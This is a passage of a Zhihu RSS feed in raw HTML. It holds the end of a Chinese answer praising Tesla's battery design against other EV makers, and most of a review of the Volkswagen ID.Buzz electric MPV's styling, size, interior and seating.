data-pid=\"nhEt5HYy\">当然，老王也不是无脑特吹的人！继续</p>\n<p><img src=\"https://pic1.zhimg.com/v2-155b3180887e96417e41814797d95a1d_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-155b3180887e96417e41814797d95a1d\" data-watermark-src=\"v2-6bfc55fa48cfaebb8ee97ee4065b103f\" data-private-watermark-src=\"v2-feacbac25fa51bd64c19e627ac43a816\"></p>\n<p data-pid=\"mSJ4cE9E\"><b>2、其次，特斯拉电池到底好在哪里？</b></p>\n<p data-pid=\"v1QiT6HW\">针对这点老王可以从几个维度简单跟大家分享下从专业视角对特斯拉电池的评价，相信大家会更容易理解上一条。</p>\n<p data-pid=\"VbhX4LXr\"><b>（1）特斯拉电池的发展</b></p>\n<p data-pid=\"op_rcNKi\">特斯拉的电池发展大致可以分为三个阶段：小模组阶段——大模组阶段——无模组阶段。特斯拉2013年的Model S用的小模组，7、8000千颗18650电芯，电量就已经做到了85度。现在火的不行的3/Y早期用的21700电芯的大模组方案已经开始高度集成预计今年底量产的Model Y/ S搭载的46800电芯和CTC技术基本已经到集成天花板了！<b>在当下的基础上，特斯拉下一代46800电芯容量是21700的5倍，电池能量密度提升14%，能够提高相应车型约16%的续航里程，在电池层面每度电的成本降低14%。讲真，未来的特斯拉产品，竞争力真的太可怕了！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-35657795d9b4f2f4c3210643eacbff6e_720w.jpg?rss\" data-rawwidth=\"850\" data-rawheight=\"450\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-35657795d9b4f2f4c3210643eacbff6e\" data-watermark-src=\"v2-8f9f4086d87087ded9fa23eab459be96\" data-private-watermark-src=\"v2-b1fd1e0ee4f6bc8202facd27a37fe435\"></p>\n<p data-pid=\"BibW9dIY\"><b>（2）特斯拉的软硬件设计</b></p>\n<p data-pid=\"IDch2699\">特斯拉的软硬件设计方面简单说来，结构安全可靠，热管理系统复杂但是效率很高，电池管理系统高度定制化和冗余保护。老早就有了防爆阀、主动式保险丝、FPC等设计方案。可以说领先了很多产品1～2代（当然，特斯毕竟在这方面耕耘了很多年了）。不过从另一个角度来看，某些激进的技术应用让很多人对其可靠性也产生一定程度的质疑，甚至包括我！</p>\n<p data-pid=\"no_9O_Lz\">估计很多人都比较晕，还是没太明白到底好在哪儿，继续，比比就知道了！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a987574c1c678bce03fc4eec795eb666_720w.jpg?rss\" data-rawwidth=\"554\" data-rawheight=\"243\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a987574c1c678bce03fc4eec795eb666\" data-watermark-src=\"v2-a2a0d243a68407f6f4427562646cb2d4\" data-private-watermark-src=\"v2-98b35a9d4d88d68af20a63f2648bd94b\"></p>\n<h3><b>3、最后，除了特斯拉，其它家的电池怎么样？</b></h3>\n<p data-pid=\"es0AWHcy\">关注老王的人应该都知道，经老王的手公开拆过的电池不少，包括特斯拉的、理想的、小鹏的、北汽的、沃尔沃的等等。早期理想one的电池是供应商直接供的，一般般。小鹏的也差不多。北汽极狐的电池在安全性上考虑的比较多。沃尔沃XC40纯电的更是，设计非常保守，不过受限于车的架构，集成度不高。</p>\n<p data-pid=\"LmX2Omfp\"><b>特斯拉相对来说比刚才提到的不管是从结构设计、集成度还是热管理系统、电池管理系统都有其独到之处，别人也很难复刻！</b>也正因为其高度集成和定制化的设计，导致其电池成本偏高，可维修性差。<b>在很多方面，特斯拉设计都很大胆和激进，但人流弊的一点是总能找到一种手段去做失效保护，甚至有时候有点不计成本！</b>当然，羊毛出在羊身上，最后还是得由我们消费者买单。这不，今天家里领导刚下完单，特斯拉又涨价了！</p>\n<p data-pid=\"Uoe8ygqB\">不过，在当下这个行业和技术发展的大环境下，<b>除了特斯拉，我们国内的企业也涌现出很多值得点赞的电池设计。</b>比如比亚迪的刀片电池，对电芯结构做了创新，大大提高了磷酸铁锂电池的体积密度。还有像之前宁德时代提出的CTP概念，也是高度集成化设计趋势。还有很多奇奇怪怪得电池也挺有意思，比如：大禹电池、琥珀电池、弹匣电池…后面找机会跟大家分享都是啥东东！</p>\n<p data-pid=\"gKykZCev\"><b>好了，篇幅有限，就到这！</b></p>\n<p data-pid=\"neGsj1Ew\"><b>关注我，带你了解跟多电动汽车知识和内幕，回见！</b></p>\n<p data-pid=\"bL5inBtY\"><b>特斯拉Model Y电池拆解视频：</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/446317317\" class=\"internal\">如果拆开一台特斯拉，能发现哪些「瓜」？</a><hr>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/520427167/answer/2381765753\" data-image=\"https://pic2.zhimg.com/v2-b108d012136d8cd97324150186ad8259_bh.jpg\" data-image-width=\"3264\" data-image-height=\"2448\" class=\"internal\">有人说「买电车就是买电池」，购车小白怎么快速判断电池好与坏？</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/river_wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">工科男老王</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520435159/answer/2383819257?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266766815?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">特斯拉为什么要单独使用一块12V的铅酸电池？</a><br><a href=\"http://www.zhihu.com/question/266233857?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价特斯拉承认 Model 3 部分环节确需手工完成，但电池没有问题?</a><br>\n","link":"http://www.zhihu.com/question/520435159/answer/2383819257?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"大众发布电动面包车 ID.BUZZ，带有诸多 T1 元素，该款电动 MPV 还有哪些值得关注的地方？","date":"2022-03-11 02:52:37","description":"\n<p data-pid=\"0q4cbhsV\">“I’ve been writing for Motor1 for 10 years and I can assure you Volkswagen has never generated so much hype around a new product. ” 译：我已经为Motor1撰稿了10年，我可以向你保证，<b>大众从未围绕新产品进行过如此多的炒作</b>。 </p>\n<p data-pid=\"sRn_w2ni\">上面这段话出自一位海外的汽车媒体撰稿人。正如他所说，大众极其罕见地为发布一款新产品进行如此炒作，而这款产品就是大众首款纯电平台MPV——ID.Buzz。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0d2790f3be7e68867018d7e690002307_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-0d2790f3be7e68867018d7e690002307\" data-watermark-src=\"v2-103d2d7f0cbbe68dfcfbcf8d5ac2cc3f\" data-private-watermark-src=\"v2-c72e7c1bdb1f655a78a71db865ffe36e\"></p>\n<p data-pid=\"pYj9TnUi\">全文目录</p>\n<ul>\n<li data-pid=\"KXfMrSsa\">大众ID.Buzz5年漫长等待路</li>\n<li data-pid=\"NP0wsP_6\">大众ID.Buzz好看吗？</li>\n<li data-pid=\"pfohFuSZ\">大众ID.Buzz有多大？</li>\n<li data-pid=\"6CBqkal4\">大众ID.Buzz内饰及座椅如何？</li>\n<li data-pid=\"lwvy4F4e\">有哪些实用的细节设计？</li>\n<li data-pid=\"0ZMLasFt\">作为纯电MPV，续航怎么样？</li>\n<li data-pid=\"e92bt8m0\">大众ID.Buzz智能化表现如何？</li>\n<li data-pid=\"C5zODoi-\">还有个厢货变体版本？</li>\n</ul>\n<h2><b>一、大众ID.Buzz5年漫长等待路</b></h2>\n<p data-pid=\"O70K5lqp\">5年前的2017年1月9日，北美国际车展上，大众ID.Buzz Concept概念车全球首发。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d53b141659c994f4e728c087c948793_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-7d53b141659c994f4e728c087c948793\" data-watermark-src=\"v2-afd8e8084efab132455eb663543dc773\" data-private-watermark-src=\"v2-acd503b23b723729080bbb3eda315679\"></p>\n<p data-pid=\"4ARaNwUM\">致敬经典，复古中融合现代时尚，极具未来感的智能座舱，又有顶尖的自动驾驶技术……引得我等一众粉丝追捧，特别是海外的一些情怀用户。</p>\n<p data-pid=\"_Z-CtA7d\">要知道ID.Buzz所致敬的大众Type2（T1），可是经典中的传奇、传奇中的经典……懂的人都懂。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-6668161a2cae829527c101730287ea36_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-6668161a2cae829527c101730287ea36\" data-watermark-src=\"v2-691c209cf92a8e5ab07749e33de17f2f\" data-private-watermark-src=\"v2-85f52b61562fd253c0e84bb304cc95b1\"></p>\n<p data-pid=\"ee0espXt\">但从那以后，大众ID.Buzz的后续消息就不多了，最初是各种自动驾驶方面的传播、后面就是各种谍照测试车、穿着彩虹伪装的系列预热……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fc798209ddc0d419d7e7c322e672c6ca_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"watermark\" data-original-src=\"v2-fc798209ddc0d419d7e7c322e672c6ca\" data-watermark-src=\"v2-8a978cad0d9cdfc24452505efa94b91d\" data-private-watermark-src=\"v2-35b7952297adb41998c1daa0219e528b\"></p>\n<p data-pid=\"la6toLHM\">再后面我在TWITTER上见到大众汽车CEO赫伯特·迪斯亲自为ID.Buzz量产版预热——3月9日，传奇归来！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-179ac796444b96de4b0e506d756e137b_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"595\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-179ac796444b96de4b0e506d756e137b\" data-watermark-src=\"v2-34fabbf7bbcc39385989d57e99287e97\" data-private-watermark-src=\"v2-ce82d33d04ee3684415631117f9ac77f\"></p>\n<p data-pid=\"jPXFxhnw\">5年间从概念终于走到量产，还是有些漫长。但这份等待值得吗？最终发布的量产版ID.Buzz到底怎么样？我们继续往下研究。</p>\n<h2><b>二、大众ID.Buzz好看吗？</b></h2>\n<p data-pid=\"fcZJiPgl\">好看与否在于个人审美，但不得不说，ID.Buzz的设计大概率是令多数人眼前一亮、颇具新意的，甚至说是有些呆萌、可爱、好玩儿的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9dd10d45c92ac568909d3aee167fce05_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"watermark\" data-original-src=\"v2-9dd10d45c92ac568909d3aee167fce05\" data-watermark-src=\"v2-5d43cfecd441e5f78f6678dd84379cec\" data-private-watermark-src=\"v2-454672483e852da5ffb593e35b83583e\"></p>\n<p data-pid=\"_6JMxcBF\">它的这套ID系列外观设计有多处都是在向经典致敬，例如从前格栅开始的“V”形线条将车体分为两种颜色、硕大的大众LOGO（目前所有在售大众车里logo最大的）、A柱三角窗、尾部侧面的散热孔造型、短前后悬……这些都让它多了一份文化情怀气息。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2f559f92bc5888381d4edb71bd5909e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2f559f92bc5888381d4edb71bd5909e3\" data-watermark-src=\"v2-92670ffa90183d06c9b30a064bd6b014\" data-private-watermark-src=\"v2-0c346f839cd22dd3f7e2f6d7c8a734fc\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c7f34ac140c660aee1e06affc85ebb6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-4c7f34ac140c660aee1e06affc85ebb6\" data-watermark-src=\"v2-b5cb346a37198526d1f3c7b016eafbdc\" data-private-watermark-src=\"v2-c856261bde2495442214b5dc2cdcccfe\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d08c687fb4f7e95c58be7511e3570fc0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-d08c687fb4f7e95c58be7511e3570fc0\" data-watermark-src=\"v2-e1e37ba257974b4ea4fc7a6fc3a9d9fe\" data-private-watermark-src=\"v2-e148298edd2f4749bfa95ed9be2bda27\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5b19008491abe53d2cc2e838cffd04c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-5b19008491abe53d2cc2e838cffd04c9\" data-watermark-src=\"v2-fdd4817cacd430b3fc68c07596fab33f\" data-private-watermark-src=\"v2-200036539721a0b8d890a6b1df77f2c1\"></p>\n<p data-pid=\"pgr1D5ET\">在车身颜色的选择上也很丰富，ID.Buzz共提供了11种颜色方案。</p>\n<p data-pid=\"ftabgk7T\">其中7种单色车身——Candy White（糖果白）、Mono Silver（单色银）、Lime Yellow（石灰黄）、Starlight Blue（星光蓝）、Energetic Orange（活力橙）、Bay Leaf Green（月桂叶绿）和Deep Black（深黑）。</p>\n<p data-pid=\"ILZxzaAC\">还有4种双拼色车身，其中上半部分车身都是Candy White（糖果白），而下半部分有Lime Yellow（石灰黄）、Starlight Blue（星光蓝）、Energetic Orange（活力橙）、Bay Leaf Green（月桂叶绿）。括号内为直译，要买就买双拼色，哈哈。 </p>\n<p data-pid=\"4uFQO0px\">如果将它的设计去和概念车对比，量产到概念的外观还原度也还算蛮高的。但是，内部就差点意思了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d5764224c73d196f622afb8a27b33f7f_720w.jpg?rss\" data-caption=\"↑ 概念\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-d5764224c73d196f622afb8a27b33f7f\" data-watermark-src=\"v2-3da8a6cde15a1443c2e4002e6414bdf7\" data-private-watermark-src=\"v2-f793778e8242307daba2126dd27501f0\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c7e417bd4e007853a81ef58b3766afa_720w.jpg?rss\" data-caption=\"↑ 量产\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"719\" data-watermark=\"watermark\" data-original-src=\"v2-1c7e417bd4e007853a81ef58b3766afa\" data-watermark-src=\"v2-31584950ed131262bbdccd0ab9ec2ccf\" data-private-watermark-src=\"v2-d2f0dc62392441ff6c7630f188b6a698\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-929c793bf48d32af48f8914aaa75d973_720w.jpg?rss\" data-caption=\"↑ 概念\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-929c793bf48d32af48f8914aaa75d973\" data-watermark-src=\"v2-1fc40cda7e07ab5b69ca3cbc9a84fadc\" data-private-watermark-src=\"v2-bfa19c15cc9867e26339ee1c4e820d64\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2bd97137b4e2deea2ec6c3bef9685b1e_720w.jpg?rss\" data-caption=\"↑ 量产\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2bd97137b4e2deea2ec6c3bef9685b1e\" data-watermark-src=\"v2-2d9d92bb59900f42f9ef3336e8f33a06\" data-private-watermark-src=\"v2-f05119851110958629dd28f25b913732\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2d5f1b252bcb0c5f473c9f3d3e35c741_720w.jpg?rss\" data-caption=\"↑ 概念\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-2d5f1b252bcb0c5f473c9f3d3e35c741\" data-watermark-src=\"v2-df6483a32450a5b5a24e3cdb958191dc\" data-private-watermark-src=\"v2-18df3411c763321b819ff638c75386de\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3483cd871826f74e35e6de32fc4f9392_720w.jpg?rss\" data-caption=\"↑ 量产\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-3483cd871826f74e35e6de32fc4f9392\" data-watermark-src=\"v2-cbbe63897d104a767a08a2d382bc90d0\" data-private-watermark-src=\"v2-94ff56be6e9c580f4b770d2b31909ec4\"></p>\n<h2><b>三、大众ID.Buzz有多大？</b></h2>\n<p data-pid=\"O70K5lqp\">长宽高4712mm/1985mm/1937mm，轴距2988mm。</p>\n<p data-pid=\"O70K5lqp\">这个数据是什么水平？ </p>\n<p data-pid=\"ilSY7tBz\">从我的产品数据库来看，它的长度仅为比亚迪宋MAX（4710mm）的水平，2mm的车长差距几乎可忽略不计；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e3ff0f881ae9323890d49c4d785c959f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-e3ff0f881ae9323890d49c4d785c959f\" data-watermark-src=\"v2-c8e8fb82419cab2cbc413cf4b1d727a7\" data-private-watermark-src=\"v2-a3a210c73890d7cfdcc92a0093af5938\"></p>\n<p data-pid=\"whDXniFJ\">但是它1985mm的宽度绝对是MPV中的上游水平，比起亚嘉华窄10mm、比岚图梦想家宽5mm；</p>\n<p data-pid=\"KUYjI7Lw\">1937mm的车高也是上游水平，仅比雷克萨斯LM矮了8mm、比大家熟悉的GL8 ES高了138mm；</p>\n<p data-pid=\"GRTh7gN8\">而2988mm的轴距与传祺M8、荣威iMAX8等车型的3000mm相比显得比较常规，但你要知道跟它长度差不多的宋MAX轴距仅2785mm，这主要得益于它超短的前后悬。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-43aab4829f2b7e781f1c58e015e83e69_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-43aab4829f2b7e781f1c58e015e83e69\" data-watermark-src=\"v2-8ca77cdcad4a10662338c3ef1dde7860\" data-private-watermark-src=\"v2-b40b4b5b6bf7e51ed48234a2afd58cf4\"></p>\n<p data-pid=\"PzUomWIb\">而超短的前后悬得益于电驱系统独特的布置方式，可以带来更高的空间利用率，还可以带来更小的转弯半径（这一点我在同样出自MEB平台的ID.4上已经深有体会）。 </p>\n<p data-pid=\"G-Mm7bVG\">如果放到大众MPV阵营里，ID.Buzz的尺寸是介于途安L和夏朗之间的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-dc60f7795982fdea950827c82c3e24ad_720w.jpg?rss\" data-caption=\"↑ 夏朗\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-dc60f7795982fdea950827c82c3e24ad\" data-watermark-src=\"v2-caa019c9db7017032fd084cf89a87a7c\" data-private-watermark-src=\"v2-f5244b2a5160e7b53463de4cb8bab4dc\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9cda27a0c06ec101be406a3324e86779_720w.png?rss\" data-caption=\"↑ 途安L\" data-size=\"normal\" data-rawwidth=\"902\" data-rawheight=\"548\" data-watermark=\"watermark\" data-original-src=\"v2-9cda27a0c06ec101be406a3324e86779\" data-watermark-src=\"v2-a7ea3fbef2d2f03478e035d6fcfdae83\" data-private-watermark-src=\"v2-98242258a1bc668f9bb09e9b75ddc4e3\"></p>\n<p data-pid=\"7Zklmiob\">看了这个尺寸数据不知大家什么感受，是意外？还是预期之中？</p>\n<p data-pid=\"LlfS0f8q\">在我个人看来，与接下来各中国品牌要推出的中大型甚至大型豪华商务MPV那些大块头相比，也许ID.Buzz这样的尺寸才是更多家庭用户所期待的。 </p>\n<p data-pid=\"N85_QQ6G\">另据消息，ID.Buzz在2023年还会推出长轴距版本，我们保持关注。 </p>\n<h2><b>四、大众ID.Buzz内饰及座椅如何？</b></h2>\n<p data-pid=\"SGVP46YA\">一打开车门，明显的大众ID风格。 </p>\n<p data-pid=\"qpgdTuta\">为了研究这次发布的ID.Buzz，我前一阵特意借来ID.4深入体验了几天，提前感受了大众在电动车时代下产品的风格和策略。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2d2a01172b2e6ae761af57464b6deca4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2d2a01172b2e6ae761af57464b6deca4\" data-watermark-src=\"v2-b38c1a02e616f670947ade1bcdb4bd7f\" data-private-watermark-src=\"v2-5a441af00db65840b393446fc116f0de\"></p>\n<p data-pid=\"GvHsyPS0\">也可能是开了几天ID.4，我个人对ID.Buzz这套内饰并没有太大新鲜感。最大的新鲜感可能来自和外观同色的面板，为内饰增添了不少活力。</p>\n<p data-pid=\"JB0D8OXO\">中控屏及控制区、前风挡处带警示及导航引导的LED灯带、仪表、方向盘、左侧灯光控制区，都和ID.4如出一辙，连车窗控制按键也是两个按键（不过这次发布的ID.Buzz二排车窗并不能升降，放两个按键能理解。但如果后续增加可升降的二排车窗的话，估计也会增加一个REAR的触摸按钮）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a8ac6ed54e0611e63e759215f7dbb333_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-a8ac6ed54e0611e63e759215f7dbb333\" data-watermark-src=\"v2-c615c235809e7bb182199b4083d33977\" data-private-watermark-src=\"v2-344e20c1975195e16efafaa31a668f55\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-da81c565994466d34384b2fc64ff20bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-da81c565994466d34384b2fc64ff20bc\" data-watermark-src=\"v2-2b34c0fcf3976c00c6d66800a33fc1dd\" data-private-watermark-src=\"v2-0bf83dac63b82a632a5a3edc223661eb\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9b75ca22ce896500b42e5de65298a179_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"671\" data-watermark=\"watermark\" data-original-src=\"v2-9b75ca22ce896500b42e5de65298a179\" data-watermark-src=\"v2-eaee288d8a287b4e1271883f55741c46\" data-private-watermark-src=\"v2-86c97892ee89ff972122c59be0c45128\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-89837437b257c80321cb3588b6b3b065_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"885\" data-rawheight=\"522\" data-watermark=\"watermark\" data-original-src=\"v2-89837437b257c80321cb3588b6b3b065\" data-watermark-src=\"v2-61bf3020743050e714e863b1e7c2bcb1\" data-private-watermark-src=\"v2-e72f34eae029a52d0fd710345e5a2c63\"></p>\n<p data-pid=\"1dhJjR4h\">挡杆不再是ID.4那种和仪表相连，而是大众车中很少见的“怀挡”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-53c6bffd3c5cf1b843d233714dc0f90c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"952\" data-rawheight=\"591\" data-watermark=\"watermark\" data-original-src=\"v2-53c6bffd3c5cf1b843d233714dc0f90c\" data-watermark-src=\"v2-99009d96876f32c53fb7862d34b5afcd\" data-private-watermark-src=\"v2-552345aeccb8b71d0b419b308f8f616d\"></p>\n<p data-pid=\"nMn8V-SS\">但是作为MPV来讲，在实用性上的设计考虑必须要更周到的。</p>\n<p data-pid=\"Anl2wO4d\">比如我很喜欢的前排左右贯穿式设计，而不是轿车/SUV那种一体的中控台，以及大众版本的“魔吧”……还有各种实用的小储物空间等等，这部分我们放在下个话题来说。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c455c815fec37aaec1b3495aecdfa8e1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"648\" data-watermark=\"watermark\" data-original-src=\"v2-c455c815fec37aaec1b3495aecdfa8e1\" data-watermark-src=\"v2-aeddee12e71c5153ab020b5d35d2ab9e\" data-private-watermark-src=\"v2-9aa3ca0837543931697de636f99618e4\"></p>\n<p data-pid=\"gHzyOg1F\">另外内饰用料也更加强调环保，比如没有任何皮革。方向盘由聚氨酯制成，看起来与皮革比较接近。座椅、地板覆盖物、车顶内衬，均采用再生材料（一种由纱线制成的织物，其纤维由 10% 收集的海洋塑料和 90% 回收的 PET 瓶组成）。</p>\n<p data-pid=\"WBUehxD0\">重点说下座椅布局，可能大家很好奇，这么一辆MPV怎么只有两排5座？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-92e1c00c2c0e1239f062a162f0219895_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-92e1c00c2c0e1239f062a162f0219895\" data-watermark-src=\"v2-205a9fe6a16ee765f64e071f73233b05\" data-private-watermark-src=\"v2-4789fa3c31edf87da632c68a564db859\"></p>\n<p data-pid=\"wwHJcI1l\">是的，首发的这个标准轴距版本仅提供了2+3的五座布局，并没有第三排。</p>\n<p data-pid=\"guH2O0me\">在这个标准轴距基础上，2+2+2的六座版本也会在稍后推出。在2023年还会推出一款长轴距版本，届时会采用2+3+2的七座布局。</p>\n<p data-pid=\"YBhgm2jJ\">前排的两个座椅两侧都有可调节角度的扶手，其中内侧为标配，外侧为选装。座椅为电动调节，带有记忆和按摩功能。前后最大可调范围为245毫米，可调高度为61.5毫米。</p>\n<p data-pid=\"YvkYPGJq\">每个前排座椅的靠背都集成了一个侧面胸部安全气囊。在驾驶员座椅上还有一个中央安全气囊，在发生碰撞时可以保护驾驶员和前排乘客不发生碰撞。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2536169b76ef7452334fd2efca2a6b55_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-2536169b76ef7452334fd2efca2a6b55\" data-watermark-src=\"v2-96b95a5c7f001e67d4b6a221bb56ee1a\" data-private-watermark-src=\"v2-8cf4e5112af297a766449896c709dadb\"></p>\n<p data-pid=\"xkiXWq8l\">二排可向前折叠或按40:60比例折叠，座椅并不能和地板形成纯平，只能靠背放倒。二排座椅的前后可移动范围为150毫米。没有第三排座椅的后备厢非常宽敞，容积达1121L。 </p>\n<p data-pid=\"dGBWq8pJ\">对了，两侧电动侧滑门是必须的。后排侧滑门有两个开关，一个是B柱上的按键，另一个是窗框上的拉手。B柱上还设计有方便上下车的拉绳。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c9f055095de05b212380b94e9a753d3_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"783\" data-rawheight=\"440\" data-watermark=\"watermark\" data-original-src=\"v2-4c9f055095de05b212380b94e9a753d3\" data-watermark-src=\"v2-43f800745580bac85734a8fa860418fd\" data-private-watermark-src=\"v2-9ec47ab5d70ac33aae493b153569fd18\"></p>\n<h2><b>五、有哪些实用的细节设计？</b></h2>\n<p data-pid=\"VSEoXoF9\">先说一些有关实用的细节设计。 </p>\n<p data-pid=\"JxesGiBW\">中控台上的储物空间还是蛮丰富的，比如副驾侧是一个带防滑垫的储物槽。方向盘的两侧也有小储物槽，其中右侧还有两个Type-C充电口。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ad64b9a125e105e532f433c82de37eaf_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"557\" data-watermark=\"watermark\" data-original-src=\"v2-ad64b9a125e105e532f433c82de37eaf\" data-watermark-src=\"v2-02a66f0acbaf38763a7a2d349db5460d\" data-private-watermark-src=\"v2-3b13fb1efd524920562c7850fc2a3b50\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6235d489bbfaf21e4eb26d55d445cc78_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"651\" data-watermark=\"watermark\" data-original-src=\"v2-6235d489bbfaf21e4eb26d55d445cc78\" data-watermark-src=\"v2-d61489daaab465908d49873472f5d3f5\" data-private-watermark-src=\"v2-10bc76585cbb67daba4ab1da38d40b85\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2974906487fe5d19fed57d696a955637_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"714\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-2974906487fe5d19fed57d696a955637\" data-watermark-src=\"v2-84ee7c309fd83e42d2514840b3fbf551\" 